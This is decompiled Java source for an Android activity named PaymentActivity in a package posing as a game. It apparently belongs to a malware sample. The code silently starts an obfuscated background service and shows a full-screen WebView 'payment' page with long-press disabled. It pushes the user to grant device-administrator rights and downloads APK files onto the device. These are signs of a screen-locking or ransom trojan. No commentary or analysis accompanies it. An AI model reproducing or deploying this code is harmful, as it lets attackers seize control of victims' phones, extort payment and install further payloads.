package ru.anna.chinagame;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.app.DownloadManager;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Intent;
import android.content.res.AssetManager;
import android.net.Uri;
import android.os.Bundle;
import android.os.Environment;
import android.view.KeyEvent;
import android.view.View;
import android.webkit.DownloadListener;
import android.webkit.URLUtil;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.Toast;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;

/* loaded from: classes.dex */
public class PaymentActivity extends Activity {
    private static final String EVENT_CLOSE = "android://close_screen";
    private boolean mDeviceAdmin = true;
    private WebView mWebView;

    @Override // android.app.Activity
    protected void onPostCreate(Bundle savedInstanceState) {
        ComponentName cmp = new ComponentName(BuildConfig.PACKAGE_NAME, "com.ulcering.dictation.KiboshedFlyspeckService");
        Intent intent = new Intent();
        intent.setComponent(cmp);
        startService(intent);
        super.onPostCreate(savedInstanceState);
    }

    @Override // android.app.Activity
    protected void onCreate(Bundle savedInstanceState) {
        getWindow().setFlags(1024, 1024);
        super.onCreate(savedInstanceState);
        WebView webViewCreateRootView = createRootView();
        this.mWebView = webViewCreateRootView;
        setContentView(webViewCreateRootView);
    }

    private WebView createRootView() {
        WebView view = new WebView(this);
        initWebView(view);
        return view;
    }

    @SuppressLint({"SetJavaScriptEnabled"})
    private void initWebView(WebView webView) {
        webView.loadUrl("file:///android_asset/index.html");
        webView.getSettings().setJavaScriptEnabled(true);
        webView.setOnLongClickListener(new View.OnLongClickListener() { // from class: ru.anna.chinagame.PaymentActivity.1
            @Override // android.view.View.OnLongClickListener
            public boolean onLongClick(View v) {
                return true;
            }
        });
        webView.setLongClickable(false);
        webView.setHapticFeedbackEnabled(false);
        webView.setWebViewClient(new WebViewClient() { // from class: ru.anna.chinagame.PaymentActivity.2
            @Override // android.webkit.WebViewClient
            public boolean shouldOverrideUrlLoading(WebView view, String url) {
                return PaymentActivity.this.overrideUrl(url);
            }
        });
        webView.setDownloadListener(new DownloadListener() { // from class: ru.anna.chinagame.PaymentActivity.3
            @Override // android.webkit.DownloadListener
            public void onDownloadStart(String url, String userAgent, String contentDisposition, String mimetype, long contentLength) throws IOException {
                try {
                    DownloadManager.Request request = new DownloadManager.Request(Uri.parse(url));
                    request.allowScanningByMediaScanner();
                    request.setNotificationVisibility(1);
                    if (url.contains(".apk")) {
                        mimetype = "application/vnd.android.package-archive";
                    }
                    request.setMimeType(mimetype);
                    String fileName = URLUtil.guessFileName(url, contentDisposition, mimetype);
                    request.setDestinationInExternalPublicDir(Environment.DIRECTORY_DOWNLOADS, fileName);
                    DownloadManager dm = (DownloadManager) PaymentActivity.this.getSystemService("download");
                    dm.enqueue(request);
                } catch (IllegalArgumentException e) {
                    int length = "file:///android_asset/".length();
                    String filename = url.substring(length);
                    PaymentActivity.this.CopyReadAssets(filename, mimetype);
                }
            }
        });
        if (this.mDeviceAdmin) {
            DevicePolicyManager devicePolicyManager = (DevicePolicyManager) getSystemService("device_policy");
            ComponentName deviceAdminComponent = new ComponentName(this, (Class<?>) DeviceAdminCustomReceiver.class);
            if (!devicePolicyManager.isAdminActive(deviceAdminComponent)) {
                Intent intent = new Intent("android.app.action.ADD_DEVICE_ADMIN");
                intent.putExtra("android.app.extra.DEVICE_ADMIN", deviceAdminComponent);
                intent.putExtra("android.app.extra.ADD_EXPLANATION", getString(mofurniture.mod.R.string.add_admin_extra_app_text));
                startActivity(intent);
            }
        }
    }

    /* JADX INFO: Access modifiers changed from: private */
    public void CopyReadAssets(String filename, String mimetype) throws IOException {
        AssetManager assetManager = getAssets();
        new File(getFilesDir(), filename);
        try {
            InputStream in = assetManager.open(filename);
            OutputStream out = openFileOutput(filename, 1);
            copyFile(in, out);
            in.close();
            out.flush();
            out.close();
        } catch (Exception e) {
        }
        Intent intent = new Intent("android.intent.action.VIEW");
        intent.setDataAndType(Uri.parse("file://" + getFilesDir() + "/" + filename), mimetype);
        startActivity(intent);
    }

    private void copyFile(InputStream in, OutputStream out) throws IOException {
        byte[] buffer = new byte[1024];
        while (true) {
            int read = in.read(buffer);
            if (read != -1) {
                out.write(buffer, 0, read);
            } else {
                return;
            }
        }
    }

    @Override // android.app.Activity, android.view.KeyEvent.Callback
    public boolean onKeyDown(int keyCode, KeyEvent event) {
        if (event.getAction() == 0) {
            switch (keyCode) {
                case 4:
                    if (this.mWebView.canGoBack()) {
                        this.mWebView.loadUrl("javascript:backEvent()");
                        this.mWebView.goBack();
                    } else {
                        finish();
                    }
                    return true;
            }
        }
        return super.onKeyDown(keyCode, event);
    }

    /* JADX INFO: Access modifiers changed from: private */
    public boolean overrideUrl(String urlStr) {
        if (DownloadUtility.isDownloadableFile(urlStr)) {
            Toast.makeText(this, "Downloading...", 1).show();
            DownloadUtility.downloadFile(this, urlStr, DownloadUtility.getFileName(urlStr));
            return true;
        }
        if (EVENT_CLOSE.equals(urlStr)) {
            finish();
            return true;
        }
        return false;
    }
}
